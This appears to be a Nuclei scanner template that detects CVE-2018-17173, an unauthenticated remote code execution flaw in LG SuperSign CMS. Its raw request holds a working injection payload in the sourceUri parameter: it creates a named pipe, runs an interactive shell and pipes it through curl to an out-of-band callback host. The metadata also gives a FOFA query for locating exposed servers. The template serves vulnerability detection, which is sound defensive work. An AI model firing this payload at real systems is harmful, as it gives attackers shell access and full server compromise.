http:
- matchers:
  - condition: or
    part: interactsh_protocol
    type: word
    words:
    - http
    - dns
  - part: interactsh_request
    type: word
    words:
    - 'User-Agent: curl'
  matchers-condition: and
  raw:
  - 'GET /qsr_server/device/getThumbnail?sourceUri=\''%2b-%253brm%2b/tmp/f%253bmkfifo%2b/tmp/f%253bcat%2b/tmp/f|/bin/sh%2b-i%2b2>%25261|curl%2bhttp%253a//{{interactsh-url}}%2b>/tmp/f%253b\'';&targetUri=%2Ftmp%2Fthumb%2Ftest.jpg&mediaType=image&targetWidth=400&targetHeight=400&scaleType=crop&_=1537275717150
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2018-17173
info:
  author: pussycat0x
  classification:
    cpe: cpe:2.3:a:lg:supersign_cms:2.5:*:*:*:*:*:*:*
    cve-id: CVE-2018-17173
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-94
    epss-percentile: 0.98888
    epss-score: 0.76568
  description: 'LG SuperSign CMS allows remote attackers to execute arbitrary code
    via the sourceUri parameter to qsr_server/device/getThumbnail.

    '
  impact: 'Unauthenticated attackers can execute arbitrary system commands on LG SuperSign
    CMS servers via the sourceUri parameter, leading to complete server compromise
    and potential access to connected digital signage systems.

    '
  metadata:
    fofa-query: title="LG SuperSign"
    max-request: 1
    product: supersign_cms
    vendor: lg
  name: LG Supersign EZ CMS - Remote Code Execution
  reference:
  - http://mamaquieroserpentester.blogspot.com/2018/09/lg-supersign-rce-to-luna-and-back-to.html
  - http://packetstormsecurity.com/files/152733/LG-Supersign-EZ-CMS-Remote-Code-Execution.html
  - https://www.exploit-db.com/exploits/45448/
  - https://www.exploit-db.com/exploits/46795/
  remediation: 'Upgrade to a patched version of LG SuperSign CMS that addresses CVE-2018-17173.

    '
  severity: critical
  tags: cve,cve2018,lg,supersign-cms,rce,vkev,vuln
